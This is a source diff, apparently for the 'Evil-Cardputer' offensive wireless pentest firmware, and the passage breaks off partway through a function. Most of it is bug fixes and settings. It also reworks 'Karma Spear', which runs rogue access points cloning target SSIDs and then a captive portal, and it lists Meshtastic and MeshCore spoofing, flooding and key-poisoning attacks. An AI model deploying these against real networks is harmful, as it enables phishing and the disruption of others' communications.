+        waitAndReturnToMenu(sel + " selected");
+      }
       needsDisplayUpdate = true;
       keyHandledEnter = true;
     }
     // BACK
     else if (kp(KEY_BACKSPACE)) {
+      if (pickOnly) { enterDebounce(); return -1; }                 // selector mode: cancelled
       inMenu = true;
       drawMenu();
       break;
@@ -4126,6 +4451,7 @@ void showWifiList() {
       keyHandledEnter = false;
     }
   }
+  return -1;
 }
 
 
@@ -4470,6 +4796,13 @@ void createCaptivePortal() {
   dnsServer.start(DNS_PORT, "*", ipAP);
   isCaptivePortalOn = true;
   
+  // Register all HTTP routes only ONCE per boot. WebServer::on() appends a
+  // handler (with std::function captures) every call and never frees them, so
+  // re-running createCaptivePortal() per feature entry leaked heap until
+  // operator new aborted (e.g. Karma Auto's intermittent crash). softAP/DNS and
+  // server.begin() below still run each call; the routes persist on the server.
+  static bool s_portalRoutesDone = false;
+  if (!s_portalRoutesDone) {
   // --- TagTinker Web API ---
   server.on("/tt", HTTP_GET, []() {
       File f = SD.open("/evil/esl/webui.html");
@@ -5370,6 +5703,8 @@ server.on("/evil-menu", HTTP_GET, []() {
   server.on("/api/ciw/alerts", HTTP_GET, handleCiwAlertsApi);
 
   setupNavigatorRoutes();
+  s_portalRoutesDone = true;
+  }  // end one-time route registration
   server.begin();
   Serial.println(F("-------------------"));
   Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(12) + " Portal !");
@@ -6591,6 +6926,14 @@ void listPortalFiles() {
 
 void changePortal() {
   listPortalFiles();
+  // #120: with no portal files, the navigation code does `% numPortalFiles` (==0)
+  // -> integer divide-by-zero -> panic/reset, and `portalFiles[idx]` is out of
+  // bounds. Bail out cleanly instead (e.g. fresh SD with no /evil/sites/*.html).
+  if (numPortalFiles <= 0) {
+    waitAndReturnToMenu("No portals in /evil/sites");
+    return;
+  }
+  if (portalFileIndex < 0 || portalFileIndex >= numPortalFiles) portalFileIndex = 0;
   const int listDisplayLimit = M5.Display.height() / 12;
   bool needDisplayUpdate = true;
   bool keyHandled = false;  // Pour gérer la réponse à la touche une fois
@@ -7669,7 +8012,7 @@ static void poisonCatalog(const String& title, const PoisonEntry* entries, int c
   int sel = 0, top = 0;
   const int rowH = 12;
   const int headerY = 15;
-  const int visible = 9;
+  const int visible = 10;   // use full screen height (15 + 10*12 = 135)
   bool redraw = true;
   enterDebounce();
 
@@ -7688,9 +8031,14 @@ static void poisonCatalog(const String& title, const PoisonEntry* entries, int c
     if (redraw) {
       redraw = false;
       M5.Display.clear();
+      // header bar with title (same style as Cap NFC, green accent)
+      M5.Display.fillRect(0, 0, M5.Display.width(), 14, 0x0841);
+      M5.Display.drawFastHLine(0, 14, M5.Display.width(), TFT_GREEN);
       M5.Display.setTextSize(1.5);
-      M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
-      M5.Display.setCursor(5, 0);
+      M5.Display.setTextColor(TFT_GREEN, 0x0841);
+      int tw = (int)(title.length() * 9);           // ~9px/char at textSize 1.5
+      int tx = (M5.Display.width() - tw) / 2; if (tx < 0) tx = 0;
+      M5.Display.setCursor(tx, 0);
       M5.Display.println(title);
       for (int i = 0; i < visible; i++) {
         int idx = top + i;
@@ -7715,6 +8063,29 @@ static void poisonCatalog(const String& title, const PoisonEntry* entries, int c
 
 void poisonMeshMenu() {
   static const PoisonEntry entries[] = {
+    { "Live Nodes",
+      "Passive real-time list of Meshtastic nodes heard on the mesh: name, RSSI, age, GPS flag. Receive only, no injection.", pm::ui_live },
+    { "Flood Nodes",
+      "Mass injection of phantom nodes with random names and hardware ids to pollute the mesh node DB.", pm::ui_flood },
+    { "MeshGrow",
+      "Periodic injection of nodes at random GPS positions. Toggle ON / OFF.", pm::ui_meshgrow },
+    { "Namechange",
+      "Rename an existing node, choosing an arbitrary board / hardware model.", pm::ui_namechange },
+    { "Position Poison",
+      "Relocate a target node to a preset destination (Malvinas, Egypt, Australia, Rome).", pm::ui_position },
+    { "Mesh Move",
+      "Auto-relocate every discovered node, renaming each one as 'Moved'.", pm::ui_meshmove },
+    { "Mesh Impersonator",
+      "Impersonate a node to send text messages, with optional repeat count.", pm::ui_impersonator },
+    { "PKI Poison",
+      "CVE-2025-55293: wipe a target node's stored public key, breaking PKI and enabling identity spoofing.", pm::ui_pki },
+    { "ChattyMesh",
+      "Continuous impersonation of random nodes with random text. Toggle ON / OFF, random 2-6 s delay.", pm::ui_chatty },
+    { "GhostMesh",
+      "Persistent phantom node (manual name + X25519 key derived from the node id) to spoof messages for the whole session.", pm::ui_ghost },
+    { "Setup LoRa (RF)",
+      "LoRa region + modem preset. Regions US..JP; presets ShortTurbo..VeryLongSlow (default LongFast).\n"
+      "Channel frequency is derived from region + preset and applied to the SX1262.", pm::ui_lora_setup },
     { "About PoisonMesh",
       "Meshtastic LoRa pentest PoC by Teno.\n"
       "HW: Cardputer ADV + Cap LoRa-1262\n"
@@ -7722,41 +8093,14 @@ void poisonMeshMenu() {
       "CVE-2024-51500: LoRa amp / DoS.\n"
       "CVE-2025-55293: PKI key poisoning.\n"
       "Authorized use only." },
-    { "Setup LoRa (RF)",
-      "LoRa region + modem preset. Regions US..JP; presets ShortTurbo..VeryLongSlow (default LongFast).\n"
-      "Channel frequency is derived from region + preset and applied to the SX1262.", pm::ui_lora_setup },
-    { "1 Flood Nodes",
-      "Mass injection of phantom nodes with random names and hardware ids to pollute the mesh node DB.", pm::ui_flood },
-    { "2 MeshGrow",
-      "Periodic injection of nodes at random GPS positions. Toggle ON / OFF.", pm::ui_meshgrow },
-    { "3 Namechange",
-      "Rename an existing node, choosing an arbitrary board / hardware model.", pm::ui_namechange },
-    { "4 Position Poison",
-      "Relocate a target node to a preset destination (Malvinas, Egypt, Australia, Rome).", pm::ui_position },
-    { "5 Mesh Move",
-      "Auto-relocate every discovered node, renaming each one as 'Moved'.", pm::ui_meshmove },
-    { "6 Mesh Impersonator",
-      "Impersonate a node to send text messages, with optional repeat count.", pm::ui_impersonator },
-    { "7 PKI Poison",
-      "CVE-2025-55293: wipe a target node's stored public key, breaking PKI and enabling identity spoofing.", pm::ui_pki },
-    { "8 ChattyMesh",
-      "Continuous impersonation of random nodes with random text. Toggle ON / OFF, random 2-6 s delay.", pm::ui_chatty },
-    { "9 GhostMesh",
-      "Persistent phantom node (manual name + X25519 key derived from the node id) to spoof messages for the whole session.", pm::ui_ghost },
   };
-  poisonCatalog("PoisonMesh (Meshtastic)", entries, sizeof(entries) / sizeof(entries[0]), pm::pumpRx, pm::radioRelease);
+  if (!pm::pm_nodedb_alloc()) { return; }                 // lazy node DB (freed on exit)
+  poisonCatalog("PoisonMeshtastic", entries, sizeof(entries) / sizeof(entries[0]), pm::pumpRx, pm::radioRelease);
+  pm::pm_nodedb_free();
 }
 
 void poisonCoreMenu() {
   static const PoisonEntry entries[] = {
-    { "About PoisonCore",
-      "MeshCore LoRa pentest PoC by Teno,\n"
-      "sibling of PoisonMesh.\n"
-      "HW: Cardputer ADV + Cap LoRa-1262\n"
-      "(SX1262), sync word 0x12.\n"
-      "GHSA draft: unauth sender identity\n"
-      "+ weak replay (CWE-345/290/294).\n"
-      "Authorized use only." },
     { "Announce Flood",
       "Flood MeshCore adverts. Refresh mode (own identity, timestamp++) or Sybil mode (new identity per advert).", pc::ui_flood },
     { "Channel / DM Spoof",
@@ -7770,11 +8114,21 @@ void poisonCoreMenu() {
     { "Regen Identity",
       "Generate a fresh Ed25519 keypair + name (reset) for cost-free Sybil identities.", pc::ui_regen },
     { "Recon / Sniffer",
-      "Passive RX; list the adverts and nodes observed on the mesh.", pc::ui_recon },
+      "Passive RX in real time: list every advert/node heard (prefix, type C/R/M, name, RSSI, age). Scroll with ;/. Receive only.", pc::ui_recon },
     { "Config RF",
       "Preset / Freq / BW / SF / CR / TxPwr. Review and edit before any TX.", pc::ui_config_rf },
+    { "About PoisonCore",
+      "MeshCore LoRa pentest PoC by Teno,\n"
+      "sibling of PoisonMesh.\n"
+      "HW: Cardputer ADV + Cap LoRa-1262\n"
+      "(SX1262), sync word 0x12.\n"
+      "GHSA draft: unauth sender identity\n"
+      "+ weak replay (CWE-345/290/294).\n"
+      "Authorized use only." },
   };
-  poisonCatalog("PoisonCore (MeshCore)", entries, sizeof(entries) / sizeof(entries[0]), pc::pumpRx, pc::radioRelease);
+  if (!pc::pc_buffers_alloc()) { return; }                // lazy node table + DM ring (freed on exit)
+  poisonCatalog("PoisonMeshcore", entries, sizeof(entries) / sizeof(entries[0]), pc::pumpRx, pc::radioRelease);
+  pc::pc_buffers_free();
 }
 
 
@@ -7783,6 +8137,31 @@ void poisonCoreMenu() {
 Settings
 ============================================================================================================================
 */
+
+// --- Menu-idle power save setters (persisted to config) ---
+static void powerPrompt(const char* label) {
+  M5.Display.clear(TFT_BLACK);
+  M5.Display.setTextSize(1); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+  M5.Display.setCursor(5, 10); M5.Display.print(label); M5.Display.display();
+}
+void setPowerDimAfter() {
+  powerPrompt("Dim after (s), 0=off, Enter:");
+  int n = getUserInput(false, false).toInt(); if (n < 0) n = 0;
+  powerDimAfter = n; saveConfigParameter("dim_after", n);
+  Serial.println("Dim delay set to " + String(n) + "s");
+}
+void setPowerDimLevel() {
+  powerPrompt("Dim level (1-100 %), Enter:");
+  int n = getUserInput(false, false).toInt(); if (n < 1) n = 1; if (n > 100) n = 100;
+  powerDimLevel = n; saveConfigParameter("dim_level", n);
+  Serial.println("Dim level set to " + String(n) + "%");
+}
+void setPowerSleepAfter() {
+  powerPrompt("Light sleep after dim (s), 0=off:");
+  int n = getUserInput(false, false).toInt(); if (n < 0) n = 0;
+  powerSleepAfter = n; saveConfigParameter("sleep_after", n);
+  Serial.println("Sleep delay set to " + String(n) + "s");
+}
 
 void showSettingsMenu() {
     std::vector<std::pair<String, std::function<void()>>> options;
@@ -7797,6 +8176,7 @@ void showSettingsMenu() {
         options.push_back({ledOn ? "Disable LED" : "Enable LED", []() {toggleLED();}});
         options.push_back({String("Switch GPS Pins to: ") + ((gpsPinsMode == 1 || (gpsRxPin == 15 && gpsTxPin == 13)) ? "1/2" : ((gpsPinsMode == 0 || (gpsRxPin == 1 && gpsTxPin == -1)) ? "15/13" : "Auto")), [](){ toggleGpsPinsMode(); }});
         options.push_back({"Set GPS Baudrate", []() {setGPSBaudrate();}});
+        options.push_back({"GPS Diagnostics", []() {gpsDiagnostics();}});
         options.push_back({"Set Startup Image", setStartupImage});
         options.push_back({"Set Startup Volume", adjustVolume});
         options.push_back({"Set Startup Sound", setStartupSound});
@@ -7806,6 +8186,9 @@ void showSettingsMenu() {
         options.push_back({ String("Set Auto Countdown"), [](){ setBootCountdown(); }});
         options.push_back({"Set CPU Frequency", setCPUFrequency});
         options.push_back({"Change Portal IP", setCaptivePortalIP});
+        options.push_back({String("Power: Dim after (") + powerDimAfter + "s)", setPowerDimAfter});
+        options.push_back({String("Power: Dim level (") + powerDimLevel + "%)", setPowerDimLevel});
+        options.push_back({String("Power: Sleep after (") + powerSleepAfter + "s)", setPowerSleepAfter});
         
         loopOptions(options, false, true, "Settings");
         // Vérifie si BACKSPACE a été pressé pour quitter le menu
@@ -7878,6 +8261,114 @@ void setCPUFrequency() {
     }
 }
 
+
+// #118: GPS "not detected" is usually a baudrate mismatch (default is 115200 but
+// several M5 GPS units are 9600) or a wiring/antenna issue. This tool auto-detects
+// the baudrate (locks the first rate that yields valid NMEA, and persists it), then
+// streams raw NMEA + fix status so "no data" (pins/baud/HW) is told apart from
+// "data but no fix yet" (needs clear sky / cold-start warmup).
+void gpsDiagnostics() {
+  M5.Display.fillScreen(TFT_BLACK);
+  M5.Display.setTextSize(1);
+  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+  M5.Display.setCursor(2, 2);
+  M5.Display.printf("GPS diag  RX%d TX%d", gpsRxPin, gpsTxPin);
+  M5.Display.display();
+
+  // --- Auto-detect PINS x BAUD: lock the first combo that yields valid NMEA ---
+  // Sweeps the plausible GPS pin pairs (ADV 15/13, normal 1/-1, Grove 1/2 & 2/1,
+  // plus swapped RX/TX) against each common baud, so a wrong pin OR wrong baud is
+  // found, not just the baud on fixed pins.
+  struct GpsCand { int rx, tx; };
+  const GpsCand cand[] = { {gpsRxPin, gpsTxPin}, {15, 13}, {1, -1}, {1, 2}, {2, 1}, {13, 15} };
+  const int NC = (int)(sizeof(cand) / sizeof(cand[0]));
+  const int bauds[] = {115200, 9600, 38400, 57600, 19200};
+  const int NB = (int)(sizeof(bauds) / sizeof(bauds[0]));
+  int bestRx = gpsRxPin, bestTx = gpsTxPin, bestBaud = baudrate_gps, bestScore = 0;
+  bool locked = false;
+  for (int ci = 0; ci < NC && !locked; ci++) {
+    for (int bi = 0; bi < NB && !locked; bi++) {
+      cardgps.end();
+      cardgps.begin(bauds[bi], SERIAL_8N1, cand[ci].rx, cand[ci].tx);
+      M5.Display.fillRect(0, 16, 240, 24, TFT_BLACK);
+      M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+      M5.Display.setCursor(2, 16); M5.Display.printf("RX%d TX%d", cand[ci].rx, cand[ci].tx);
+      M5.Display.setCursor(2, 28); M5.Display.printf("@ %d baud ...", bauds[bi]);
+      M5.Display.display();
+      uint32_t t0 = millis(); int score = 0; char last = 0;
+      while (millis() - t0 < 650) {
+        while (cardgps.available()) {
+          char c = (char)cardgps.read();
+          if (c == '$') score += 2;
+          else if (last == '$' && c == 'G') score += 6;   // $GP.. / $GN..
+          else if (c == '\n') score += 1;
+          last = c;
+        }
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) {
+          cardgps.end(); cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
+          inMenu = true; drawMenu(); return;
+        }
+        delay(4);
+      }
+      if (score > bestScore) { bestScore = score; bestRx = cand[ci].rx; bestTx = cand[ci].tx; bestBaud = bauds[bi]; }
+      if (score >= 24) locked = true;   // valid NMEA -> lock this combo
+    }
+  }
+  if (bestScore > 0) {
+    gpsRxPin = bestRx; gpsTxPin = bestTx; baudrate_gps = bestBaud;
+    saveGPSBaudrateConfig(baudrate_gps);
+    // Persist the pins via the known modes so they survive a reboot.
+    if (gpsRxPin == 15 && gpsTxPin == 13)     { gpsPinsMode = 1; saveConfigParameter("gps_pins_mode", 1); }
+    else if (gpsRxPin == 1 && gpsTxPin == -1) { gpsPinsMode = 0; saveConfigParameter("gps_pins_mode", 0); }
+  }
+  cardgps.end();
+  cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
+
+  // --- Live view: raw NMEA ring + parsed fix ---
+  String lines[5]; int nLines = 0; String cur = "";
+  bool anyData = false; uint32_t lastDraw = 0;
+  enterDebounce();
+  while (true) {
+    while (cardgps.available()) {
+      char c = (char)cardgps.read();
+      anyData = true; gps.encode(c);
+      if (c == '\n') {
+        cur.trim();
+        if (cur.length()) {
+          if (nLines < 5) lines[nLines++] = cur;
+          else { for (int i = 0; i < 4; i++) lines[i] = lines[i + 1]; lines[4] = cur; }
+        }
+        cur = "";
+      } else if (c != '\r' && cur.length() < 60) cur += c;
+    }
+    M5.update(); cardUpdate();
+    if (kp(KEY_BACKSPACE)) break;
+    if (millis() - lastDraw > 400) {
+      lastDraw = millis();
+      M5.Display.fillScreen(TFT_BLACK);
+      M5.Display.setTextSize(1);
+      M5.Display.setTextColor(anyData ? TFT_GREEN : TFT_RED, TFT_BLACK);
+      M5.Display.setCursor(2, 2);
+      M5.Display.printf("baud %d RX%d TX%d %s", baudrate_gps, gpsRxPin, gpsTxPin, anyData ? "DATA" : "NO DATA");
+      M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+      M5.Display.setCursor(2, 14);
+      M5.Display.printf("sats %lu  fix %s", (unsigned long)gps.satellites.value(), gps.location.isValid() ? "YES" : "no");
+      if (gps.location.isValid()) {
+        M5.Display.setCursor(2, 26);
+        M5.Display.printf("%.5f, %.5f", gps.location.lat(), gps.location.lng());
+      }
+      M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
+      for (int i = 0; i < nLines; i++) { M5.Display.setCursor(2, 40 + i * 11); M5.Display.print(lines[i].substring(0, 39)); }
+      M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+      M5.Display.setCursor(2, 124); M5.Display.print("DEL=exit");
+      M5.Display.display();
+    }
+    delay(5);
+  }
+  inMenu = true;
+  drawMenu();
+}
 
 void setGPSBaudrate() {
     // Liste des baudrates disponibles
@@ -8979,6 +9470,15 @@ void restoreConfigParameter(String key) {
             if (intValue < 0 || intValue > 1) intValue = 0; // garde-fou
             portalIpIndex = intValue;
             Serial.println("Captive IP selection restored: " + String(kCaptiveIPStr[portalIpIndex]));
+          } else if (key == "dim_after") {
+            powerDimAfter = stringValue.toInt(); if (powerDimAfter < 0) powerDimAfter = 0;
+            Serial.println("Dim delay restored to " + String(powerDimAfter) + "s");
+          } else if (key == "dim_level") {
+            powerDimLevel = stringValue.toInt(); if (powerDimLevel < 1) powerDimLevel = 1; if (powerDimLevel > 100) powerDimLevel = 100;
+            Serial.println("Dim level restored to " + String(powerDimLevel) + "%");
+          } else if (key == "sleep_after") {
+            powerSleepAfter = stringValue.toInt(); if (powerSleepAfter < 0) powerSleepAfter = 0;
+            Serial.println("Sleep delay restored to " + String(powerSleepAfter) + "s");
           } else if (key == "startatboot") {
             String v = stringValue; v.toLowerCase();
             boolValue = (v == "1" || v == "true" || v == "yes" || v == "on");
@@ -10242,14 +10742,13 @@ void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (frame_type == 0x40) {
     uint8_t ssid_length_Karma_Auto = frame[25];
     if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
-      char tempSSID[33];
-      memset(tempSSID, 0, sizeof(tempSSID));
-      for (int i = 0; i < ssid_length_Karma_Auto; i++) {
-        tempSSID[i] = (char)frame[26 + i];
-      }
-      tempSSID[ssid_length_Karma_Auto] = '\0';
+      // Keep this WiFi-task callback featherweight (just like the original): copy
+      // the SSID into one slot and raise a flag. The dedup + list append is done
+      // in the app task (loopAutoKarma). Doing a spinlock + 48-entry strcmp loop
+      // here under a probe flood starved the WiFi stack and crashed hostap_attach.
       memset(lastSSID, 0, sizeof(lastSSID));
-      strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
+      for (int i = 0; i < ssid_length_Karma_Auto; i++) lastSSID[i] = (char)frame[26 + i];
+      lastSSID[ssid_length_Karma_Auto] = '\0';
       newSSIDAvailable = true;
     }
   }
@@ -10618,9 +11117,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.5.7"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.5.8"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.5.7"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.5.8"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -10824,6 +11323,71 @@ String formatTimeFromGPS() {
 }
 
 
+// Serial SD file manager: navigate and edit files on the SD card over USB.
+void sdSerialCmd(String a) {
+  a.trim();
+  if (a.length() == 0 || a == "help") {
+    Serial.println(F("sd commands:"));
+    Serial.println(F("  sd ls [path]            list a directory (default /)"));
+    Serial.println(F("  sd cat <file>           print a file"));
+    Serial.println(F("  sd append <file> <text> add a line to a file"));
+    Serial.println(F("  sd write <file> <text>  overwrite a file with one line"));
+    Serial.println(F("  sd rm <file>            delete a file"));
+    Serial.println(F("  sd mkdir <path>         create a directory"));
+    Serial.println(F("  sd rmdir <path>         remove a directory"));
+    Serial.println(F("ex: sd append /evil/KarmaList.txt Freebox-XYZ"));
+    return;
+  }
+  int sp = a.indexOf(' ');
+  String sub  = (sp < 0) ? a : a.substring(0, sp);
+  String rest = (sp < 0) ? String("") : a.substring(sp + 1);
+  rest.trim();
+
+  if (sub == "ls") {
+    String path = rest.length() ? rest : String("/");
+    File dir = SD.open(path);
+    if (!dir) { Serial.println("ls: cannot open " + path); return; }
+    if (!dir.isDirectory()) { Serial.println(path + " is a file (" + String(dir.size()) + " B)"); dir.close(); return; }
+    Serial.println("Listing " + path + ":");
+    File e = dir.openNextFile();
+    while (e) {
+      Serial.printf("  %-3s %-30s %u\n", e.isDirectory() ? "DIR" : "", e.name(), (unsigned)e.size());
+      e.close(); e = dir.openNextFile();
+    }
+    dir.close();
+  } else if (sub == "cat") {
+    if (!rest.length()) { Serial.println(F("usage: sd cat <file>")); return; }
+    File f = SD.open(rest, FILE_READ);
+    if (!f) { Serial.println("cat: not found: " + rest); return; }
+    Serial.println("---- " + rest + " ----");
+    while (f.available()) Serial.write(f.read());
+    Serial.println("\n---- end ----");
+    f.close();
+  } else if (sub == "rm") {
+    if (!rest.length()) { Serial.println(F("usage: sd rm <file>")); return; }
+    Serial.println(SD.remove(rest) ? ("removed " + rest) : ("rm failed: " + rest));
+  } else if (sub == "mkdir") {
+    if (!rest.length()) { Serial.println(F("usage: sd mkdir <path>")); return; }
+    Serial.println(SD.mkdir(rest) ? ("mkdir " + rest) : ("mkdir failed: " + rest));
+  } else if (sub == "rmdir") {
+    if (!rest.length()) { Serial.println(F("usage: sd rmdir <path>")); return; }
+    Serial.println(SD.rmdir(rest) ? ("rmdir " + rest) : ("rmdir failed: " + rest));
+  } else if (sub == "append" || sub == "write") {
+    int sp2 = rest.indexOf(' ');
+    if (sp2 < 0) { Serial.println("usage: sd " + sub + " <file> <text>"); return; }
+    String path = rest.substring(0, sp2);
+    String text = rest.substring(sp2 + 1);
+    if (sub == "write") SD.remove(path);
+    File f = SD.open(path, sub == "write" ? FILE_WRITE : FILE_APPEND);
+    if (!f) { Serial.println(sub + ": cannot open " + path); return; }
+    f.println(text);
+    f.close();
+    Serial.println(sub + " ok: " + path + " <= " + text);
+  } else {
+    Serial.println("sd: unknown '" + sub + "' (try: sd help)");
+  }
+}
+
 void createKarmaList(int maxIndex) {
 
   std::set<std::string> uniqueSSIDs;
@@ -10904,41 +11468,181 @@ int nthIndexOf(const String & str, char toFind, int nth) {
 Karma Spear
 ============================================================================================================================
 */
-void karmaSpear() {
-  isAutoKarmaActive = true;
-  createCaptivePortal();
-  File karmaListFile = SD.open("/evil/KarmaList.txt", FILE_READ);
-  if (!karmaListFile) {
-    Serial.println(F("Error opening KarmaList.txt"));
-    waitAndReturnToMenu(" No KarmaFile.");
-    return;
-  }
-  if (karmaListFile.available() == 0) {
-    karmaListFile.close();
-    Serial.println(F("KarmaFile empty."));
-    waitAndReturnToMenu(" KarmaFile empty.");
-    return;
-  }
-  while (karmaListFile.available()) {
-    String ssid = karmaListFile.readStringUntil('\n');
-    ssid.trim();
+// ---- Karma Spear UI helpers (flicker-free line cache; no probe sniffing, so no
+// promiscuous/softAP-under-flood hazard - safe to render richly). ----
+#define SPEAR_MAX 48
+static char spCache[12][48];
 
-    if (ssid.length() > 0) {
-      activateAPForAutoKarma(ssid.c_str());
-      Serial.println("Created Karma AP for SSID: " + ssid);
-      displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
-      if (karmaSuccess) {
-        karmaListFile.close();
-        waitAndReturnToMenu("return to menu");
-        return;
-      }
-      delay(200);
+// Forward decls: suppress arduino-cli's illegal `static extern "C"` prototypes.
+static void spCacheReset();
+static void spDrawLine(int slot, int y, uint16_t fg, const char* txt);
+static int  spDeploy(const char* ssid);   // 0=timeout 1=success 2=next 3=prev 4=back
+
+static void spCacheReset() { memset(spCache, 0, sizeof(spCache)); M5.Display.fillRect(0, 0, 240, 135, TFT_BLACK); }
+
+static void spDrawLine(int slot, int y, uint16_t fg, const char* txt) {
+  char key[48];
+  snprintf(key, sizeof(key), "%04X|%s", (unsigned)fg, txt);
+  if (strncmp(spCache[slot], key, sizeof(spCache[slot])) == 0) return;
+  strncpy(spCache[slot], key, sizeof(spCache[slot]) - 1); spCache[slot][sizeof(spCache[slot]) - 1] = 0;
+  M5.Display.fillRect(0, y, 240, 12, TFT_BLACK);
+  M5.Display.setTextFont(1); M5.Display.setTextSize(1);
+  M5.Display.setTextColor(fg, TFT_BLACK); M5.Display.setCursor(2, y); M5.Display.print(txt);
+}
+
+// Deploy one target AP. p=hold (freeze countdown), ,/.=prev/next, DEL=back,
+// a client connect = success. No promiscuous here, so the repeated softAP is safe.
+static int spDeploy(const char* ssid) {
+  isAPDeploying = true;
+  const int channel = 1; const bool hidden = false; const int maxClients = 15;
+  if (captivePortalPassword.isEmpty()) WiFi.softAP(ssid, nullptr, channel, hidden, maxClients);
+  else WiFi.softAP(ssid, captivePortalPassword.c_str(), channel, hidden, maxClients);
+  DNSServer dnsServer; WebServer server(80);
+  Serial.println("Karma Spear AP: " + String(ssid));
+
+  unsigned long start = millis();
+  uint32_t pausedAccum = 0, pauseStart = 0, lastKey = 0;
+  bool paused = false; int ret = 0;
+  spCacheReset();
+
+  while (true) {
+    M5.update(); cardUpdate();
+    dnsServer.processNextRequest(); server.handleClient();
+
+    uint32_t base = paused ? pauseStart : millis();
+    uint32_t el = base - start - pausedAccum;
+    int remain = (int)(autoKarmaAPDuration / 1000) - (int)(el / 1000);
+    int clients = WiFi.softAPgetStationNum();
+
+    if (clients > 0) {
+      clonedSSID = String(ssid); karmaSuccess = true; ret = 1;
+      isAutoKarmaActive = false;
+      spCacheReset();
+      spDrawLine(0, 40, TFT_GREEN, "KARMA SUCCESS");
+      char b[48]; snprintf(b, sizeof(b), "on %.28s", ssid); spDrawLine(1, 58, TFT_WHITE, b);
+      spDrawLine(2, 76, TFT_CYAN, "launching portal on it...");
+      delay(2500); break;
     }
+
+    uint32_t now = millis();
+    if (now - lastKey > 140) {
+      if (kp(KEY_BACKSPACE))       { ret = 4; lastKey = now; break; }
+      else if (kp('.') || kp('/')) { ret = 2; lastKey = now; break; }
+      else if (kp(',') || kp(';')) { ret = 3; lastKey = now; break; }
+      else if (kp('p') || kp(' ')) { paused = !paused; if (paused) pauseStart = now; else pausedAccum += now - pauseStart; lastKey = now; }
+    }
+    if (!paused && remain <= 0) { ret = 0; break; }
+
+    char b[48];
+    spDrawLine(0, 2, TFT_ORANGE, "KARMA SPEAR - deploying");
+    snprintf(b, sizeof(b), "SSID: %.30s", ssid); spDrawLine(1, 18, TFT_WHITE, b);
+    if (paused) spDrawLine(2, 36, TFT_YELLOW, "PAUSED - AP held up");
+    else { snprintf(b, sizeof(b), "time left: %d s", remain < 0 ? 0 : remain); spDrawLine(2, 36, TFT_CYAN, b); }
+    snprintf(b, sizeof(b), "clients: %d", clients); spDrawLine(3, 54, TFT_WHITE, b);
+    spDrawLine(10, 125, TFT_DARKGREY, "p hold  ,/. prev/next  DEL back");
+    delay(70);
   }
-  karmaListFile.close();
+
+  WiFi.softAPdisconnect(true);
+  isAPDeploying = false;
+  return ret;
+}
+
+void karmaSpear() {
+  // Load target SSIDs from the KarmaList file into a navigable list.
+  char spearList[SPEAR_MAX][33];
+  int  spearN = 0;
+  File f = SD.open("/evil/KarmaList.txt", FILE_READ);
+  if (!f) { waitAndReturnToMenu(" No KarmaFile."); return; }
+  while (f.available() && spearN < SPEAR_MAX) {
+    String s = f.readStringUntil('\n'); s.trim();
+    if (s.length() > 0 && s.length() <= 32) { strncpy(spearList[spearN], s.c_str(), 32); spearList[spearN][32] = 0; spearN++; }
+  }
+  f.close();
+  if (spearN == 0) { waitAndReturnToMenu(" KarmaFile empty."); return; }
+
+  isAutoKarmaActive = true;
+  karmaSuccess = false;
+  createCaptivePortal();
+  WiFi.softAPdisconnect(true);
+
+  int sel = 0, top = 0; bool autoMode = true; uint32_t lastNav = 0; const int rows = 8;
+  spCacheReset();
+
+  while (isAutoKarmaActive) {
+    M5.update(); cardUpdate();
+    uint32_t now = millis();
+
+    // AUTO: cycle the whole list, deploying each; prev/next navigates inside.
+    if (autoMode) {
+      int d = sel;
+      while (isAutoKarmaActive && autoMode) {
+        if (d < 0) d = 0;
+        if (d >= spearN) d = 0;
+        int r = spDeploy(spearList[d]);
+        if      (r == 1) break;                              // success (isAutoKarmaActive cleared)
+        else if (r == 2) d = (d + 1) % spearN;               // next
+        else if (r == 3) d = (d - 1 + spearN) % spearN;      // prev
+        else if (r == 4) { autoMode = false; sel = d; spCacheReset(); }  // DEL -> list, pause auto
+        else d = (d + 1) % spearN;                           // timeout -> next target
+      }
+      if (!isAutoKarmaActive) break;
+      continue;
+    }
+
+    // LIST view (auto paused): pick a target or resume.
+    if (kp(KEY_BACKSPACE)) { isAutoKarmaActive = false; break; }
+    if (now - lastNav > 140) {
+      if (kp(',') || kp(';')) { if (sel > 0) sel--; lastNav = now; }
+      else if (kp('.') || kp('/')) { if (sel < spearN - 1) sel++; lastNav = now; }
+      else if (kp('p') || kp(' ')) { autoMode = true; lastNav = now; }
+      else if (kp(KEY_ENTER)) {
+        int d = sel;
+        while (isAutoKarmaActive) {
+          if (d < 0) d = 0; if (d >= spearN) d = spearN - 1;
+          int r = spDeploy(spearList[d]);
+          if      (r == 2) { if (d < spearN - 1) d++; else break; }
+          else if (r == 3) { if (d > 0) d--; else break; }
+          else break;                                        // success / back / timeout
+        }
+        sel = d; spCacheReset(); lastNav = now;
+      }
+      else if (kp('a')) {                                  // add a target by typing it
+        lastNav = now;
+        M5.Display.clear(TFT_BLACK);
+        M5.Display.setTextSize(1); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
